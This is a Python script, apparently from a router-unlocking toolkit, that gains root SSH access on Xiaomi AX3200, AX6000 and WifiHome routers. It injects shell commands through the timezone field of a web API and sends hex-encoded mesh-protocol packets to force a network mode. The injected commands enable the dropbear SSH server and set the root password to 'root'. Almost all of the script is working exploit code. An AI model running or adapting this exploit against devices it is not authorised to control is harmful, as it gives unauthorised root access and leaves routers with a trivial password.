#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import types
import platform
import ctypes
import binascii
import re
import requests
import urllib
import json

import xmir_base
from gateway import *

# Devices:
# RB01    FW any        AX3200
# RB06    FW any        Redmi AX6000
# RB08    FW any        WifiHome


gw = Gateway(timeout = 4, detect_ssh = False)
if gw.status < 1:
    die("Xiaomi Mi Wi-Fi device not found (IP: {})".format(gw.ip_addr))

print("device_name =", gw.device_name)
print("rom_version = {} {}".format(gw.rom_version, gw.rom_channel))
print("mac address = {}".format(gw.mac_address))

dn = gw.device_name
gw.ssh_port = 22
ret = gw.detect_ssh(verbose = 1, interactive = True)
if ret > 0:
    die(0, "SSH server already installed and running")

info = gw.get_init_info()
if not info or info["code"] != 0:
    die('Cannot get init_info')

ccode = info["countrycode"]
print(f'Current CountryCode = {ccode}')

stok = gw.web_login()


def exec_cmd(cmd, api = 'API/misystem/set_sys_time'):
    ######
    # vuln/exploit author: remittor
    # publication: https://forum.openwrt.org/t/125008/132
    ######
    resp = gw.api_request(api, { 'timezone': " ' ; " + cmd + " ; " })
    return resp

def get_netmode():
    res = gw.api_request('API/xqnetwork/get_netmode')
    if res and res['code'] == 0:
        return int(res["netmode"])
    return -1

netmode = get_netmode()
if netmode < 0:
    die('Extension "/api/xqnetwork/get_netmode" not working!')

if netmode != 4:
    print(f"netmode = {netmode}. Attempting to set netmode to 4 ...")
    import ssl
    import socket 
    # Create an SSL context object and configure it for the client
    sslctx = ssl.create_default_context()
    sslctx.check_hostname = False
    sslctx.verify_mode = ssl.CERT_NONE
    sslctx.set_ciphers('DEFAULT')
    # Create a TCP socket object
    tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Wrap the socket with SSL encryption using the context object
    sock = sslctx.wrap_socket(tcp_sock, server_hostname = gw.ip_addr)
    # Connect to the server
    mesh_port = 19553
    sock.connect( (gw.ip_addr, mesh_port) )
    
    def ssl_raw_send(ssl_sock, hex_string, recv_size=2048):
        byte_string = bytes.fromhex(hex_string)
        ssl_sock.send(byte_string)
        response = ssl_sock.recv(recv_size)
        return response

    # Mesh Exploit source and author: https://gist.github.com/jmceleney/33c626a33960ac8a1764614cf57420cd
    # and https://gist.github.com/jmceleney/890532f8924e1e17048a0b427577ddd3
    resp = ssl_raw_send(sock,'100100a3000438633a64653a66393a62663a35643a6236000038633a64653a66393a62663a35643a6237000061646435353662636461303730380000503151527567767a6d78746b35502f70316b2b46566a724a4c716d6568494546424a6563477062516a76383d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000033433a43443a35373a32323a31433a36310000')
    resp = ssl_raw_send(sock,'10010020000538633a64653a66393a62663a35643a6236000038633a64653a66393a62663a35643a623700000100000000000000000000000000000000000000000000000000000000000000')
    resp = ssl_raw_send(sock,'10010020000738633a64653a66393a62663a35643a6236000038633a64653a66393a62663a35643a62370000017265637620636f6e6669672073796e6320636f72726563746c792e0a000000')
    sock.close()
    netmode = -1
    for i in range(7, 0, -1):
        time.sleep(1)
        netmode = get_netmode()
        if netmode < 0:
            die('Extension "/api/xqnetwork/get_netmode" not working!')
        if netmode == 4:
            break
    time.sleep(1.5)
    print(f'Forced "whc_cap" mode enabled! (netmode=4)')

if netmode != 4:
    print(f"netmode = {netmode}")
    die('It is necessary to reorganize the device into "whc_cap" mode! (Required netmode=4)')

#res = exec_cmd('logger hello_world_3335556_')
res = exec_cmd("sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
if not res or res['code'] != 0:
    die('Exploit not working!!!')
  
#res = exec_cmd("sed -i 's/`nvram get ssh_en`/1/g' /etc/init.d/dropbear")
res = exec_cmd("nvram set ssh_en=1; nvram set boot_wait=on; nvram set bootdelay=3; nvram commit")
res = exec_cmd("(echo root; sleep 1; echo root) | passwd root")
res = exec_cmd("/etc/init.d/dropbear enable")
print('Run SSH server on port 22 ...')
res = exec_cmd("/etc/init.d/dropbear restart")
res = exec_cmd("logger -t XMiR ___completed___")

time.sleep(0.5)
gw.use_ssh = True
gw.passw = 'root'
gw.ping(contimeout = 10)   # RSA host key generate slowly!

print("")
print('#### SSH and Telnet services are activated! ####')

